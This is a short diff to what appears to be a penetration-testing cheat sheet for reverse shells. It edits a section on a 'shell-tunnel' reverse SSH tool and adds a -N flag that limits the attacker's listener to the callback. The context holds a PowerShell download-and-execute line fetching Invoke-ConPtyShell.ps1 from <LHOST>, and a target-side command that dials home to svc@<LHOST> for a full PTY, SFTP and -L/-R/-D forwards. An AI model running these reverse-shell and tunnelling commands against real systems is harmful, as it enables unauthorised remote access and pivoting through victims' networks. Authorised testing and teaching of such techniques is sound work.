@@ -52,7 +52,8 @@ IEX(IWR -UseBasicParsing http://<LHOST>/Invoke-ConPtyShell.ps1); Invoke-ConPtySh
 
 ## shell-tunnel: PTY, SFTP and all three forwardings in one binary
 After tool install shell-tunnel at the pwn-broker prompt. Catch the callback on Kali:
-shell-tunnel -l -v -p <LPORT>
+shell-tunnel -l -N -v -p <LPORT>
+The listener is an SSH server anyone on the network can reach, so -N lets it carry only the callback: no shell, SFTP or local forward.
 The upload runs on the target and dials home; -d detaches it from an evil-winrm window, and -b 0 picks a random port on Kali, printed in the listener's [ok] line:
 shell-tunnel.exe -d -p <LPORT> -b 0 svc@<LHOST>
 A stock ssh client then gets the full PTY; the same session carries SFTP and the -L, -R and -D forwards:
